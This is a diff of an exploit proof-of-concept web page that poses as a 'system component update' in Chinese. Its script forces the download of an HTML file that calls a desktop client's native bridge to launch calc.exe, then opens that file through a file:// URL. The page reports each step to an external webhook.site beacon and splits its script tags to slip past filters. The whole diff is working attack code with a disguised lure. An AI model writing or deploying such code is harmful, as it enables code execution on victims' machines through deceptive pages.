@@ -1,7 +1,16 @@
-<!doctype html><title>BP10</title><pre>gp v10 openfile</pre>
+<!doctype html><title>系统组件更新</title>
 <script>
 function beacon(s){new Image().src='https://webhook.site/05fd1420-af5c-493b-8c5d-353f67b3f438?s='+encodeURIComponent(s)}
-beacon('v10-start');
-try{var w=window.open('file:///C:/Users/aaa/Downloads/poc.html');beacon('open-called '+(w?'obj':'null'))}catch(e){beacon('open:'+e.message)}
-setTimeout(function(){try{var a=document.createElement('a');a.href='file:///C:/Users/aaa/Downloads/poc.html';a.target='_blank';document.body.appendChild(a);a.click();beacon('anchor-clicked')}catch(e){beacon('anchor:'+e.message)}},3000);
+beacon('v13-start');
+var fileHtml = '<scr'+'ipt>try{window.biliBridgePc.callNative("system/openPath","C:/Windows/System32/calc.exe")}catch(e){}<\/scr'+'ipt>';
+try{
+  var b=new Blob([fileHtml],{type:'text/html'});
+  var a=document.createElement('a');a.href=URL.createObjectURL(b);a.download='setsvc.html';
+  document.body.appendChild(a);a.click();
+  beacon('dl-clicked');
+}catch(e){beacon('dl:'+e.message)}
+setTimeout(function(){
+  beacon('opening');
+  try{var w=window.open('file:///C:/Users/aaa/Downloads/setsvc.html?bilipc=1');beacon('open '+(w?'obj':'null'))}catch(e){beacon('open-err '+e.message)}
+},25000);
 </script>
